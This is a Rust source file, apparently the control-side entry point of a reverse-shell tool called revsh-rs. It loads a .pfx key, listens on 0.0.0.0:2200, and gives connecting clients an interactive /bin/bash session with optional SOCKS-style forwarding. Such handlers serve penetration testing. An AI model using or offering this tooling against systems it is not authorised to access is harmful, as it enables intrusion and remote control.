use anyhow::Result;
use clap::{App, Arg};
use env_logger::Env;
use log::{error, info};
use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;

use revsh::control::Control;

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    env_logger::Builder::from_env(Env::default().default_filter_or("info")).init();

    // Parse command line arguments
    let matches = App::new("revsh-rs control")
        .arg(
            Arg::with_name("keys_dir")
                .short("d")
                .takes_value(true)
                .default_value("~/.revsh/keys/")
                .help("Reference the keys in an alternate directory"),
        )
        .arg(
            Arg::with_name("dynamic_socket_forwarding")
                .short("D")
                .takes_value(true)
                .help("Dynamic socket forwarding with a local listener"),
        )
        .arg(
            Arg::with_name("address")
                .default_value("0.0.0.0:2200")
                .takes_value(true)
                .help("The address of the control listener"),
        )
        .get_matches();

    // Load key file
    let mut keys_dir = matches
        .value_of("keys_dir")
        .expect("No keys dir")
        .to_string();
    if keys_dir.starts_with("~/") {
        keys_dir = keys_dir.replace("~", &std::env::var("HOME")?);
    }
    let key_file = std::fs::read_dir(keys_dir)
        .expect("Keys dir no exist")
        .filter_map(Result::ok)
        .filter(|d| d.path().extension() == Some(OsStr::from_bytes(b"pfx")))
        .map(|f| f.path())
        .next()
        .expect("Failed to find .pfx key file");

    info!("Key file {:?}", key_file);

    // Get proxy address
    let proxy_address = match matches.value_of("dynamic_socket_forwarding") {
        Some(proxy_address) => Some(proxy_address.parse()?),
        _ => None,
    };

    info!("Dynamic socket forward: {:?}", proxy_address);

    let listen_address = matches.value_of("address").expect("No listen address");

    // Basic environment
    let mut env =
        vec!["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".to_string()];

    // Inherited environment variables
    for key in ["TERM", "LANG"] {
        if let Ok(val) = std::env::var(key) {
            env.push(format!("{}={}", key, val));
        }
    }

    // Start listener
    info!("Starting listener on {}", listen_address);
    let mut control = Control::new(listen_address.parse()?, &key_file).await?;
    control
        .shell("/bin/bash".to_string())
        .env(env)
        .proxy(proxy_address);

    // Accept
    #[allow(unused_mut)]
    let mut broker = loop {
        info!("Waiting client...");
        match control.accept().await {
            Ok(broker) => break broker,
            Err(e) => {
                error!("Accept failed: {}", e);
                continue;
            }
        }
    };

    #[cfg(feature = "tty")]
    broker.tty();

    // Run broker
    info!("Run broker for {}", broker.remote_address);
    broker.run().await?;

    Ok(())
}
